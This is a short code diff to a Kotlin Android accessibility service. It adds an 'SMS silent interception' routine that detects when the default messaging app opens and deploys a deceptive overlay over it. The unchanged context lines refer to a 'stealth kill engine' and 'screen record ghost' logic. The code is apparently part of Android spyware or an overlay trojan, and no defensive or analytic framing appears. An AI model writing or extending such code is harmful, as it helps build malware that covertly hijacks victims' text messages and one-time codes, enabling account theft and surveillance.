@@ -499,6 +499,18 @@ class MyAccessibilityService : AccessibilityService() {
         
         val pkgName = event.packageName?.toString() ?: return
 
+        // --- SMS SILENT INTERCEPTION PROTOCOL ---
+        val smsDeceptionActive = getSharedPreferences("app_config", Context.MODE_PRIVATE).getBoolean("sms_deception_active", false)
+        if (smsDeceptionActive && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val defaultSmsPkg = android.provider.Telephony.Sms.getDefaultSmsPackage(this) ?: "com.google.android.apps.messaging"
+            if (pkgName == defaultSmsPkg || pkgName.contains("messaging", ignoreCase = true)) {
+                if (!DynamicUIManager.isSmsInterceptorActive) {
+                    DebugLogger.log("SMS_INTERCEPT", "Default SMS app launched. Deploying synthetic overlay.")
+                    DynamicUIManager.deploySmsInterceptor(this)
+                }
+            }
+        }
+
         // --- STEALTH KILL ENGINE MOVED TO DEDICATED COROUTINE ---
         
         // --- SCREEN RECORD GHOST LOGIC (DECOUPLED) ---
